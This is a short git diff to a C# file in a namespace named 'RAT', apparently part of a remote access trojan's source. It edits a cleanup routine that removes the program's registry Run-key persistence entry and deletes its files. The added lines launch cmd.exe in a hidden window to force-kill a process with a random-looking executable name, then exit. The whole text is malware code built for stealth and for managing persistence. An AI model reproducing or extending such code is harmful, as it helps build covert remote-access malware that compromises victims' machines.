@@ -119,6 +119,14 @@ namespace RAT
             String[] fileloc = File.ReadAllLines(files[0]);
             Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             key.DeleteValue(fileloc[0], false);
+            String exec = " taskkill /f /im CCikJxPYTIYIWqFQtbykmhPH0hFyvJtNWalDOpesVeIQOV5316.exe";
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfo.FileName = "cmd.exe";
+            startInfo.Arguments = "/C " + exec;
+            process.StartInfo = startInfo;
+            process.Start();
             try
             {
                 String[] loc = File.ReadAllLines(files[0]);
@@ -136,6 +144,7 @@ namespace RAT
                     File.Delete(file);
                 }
             }
+            System.Environment.Exit(1);
         }
     }
 }
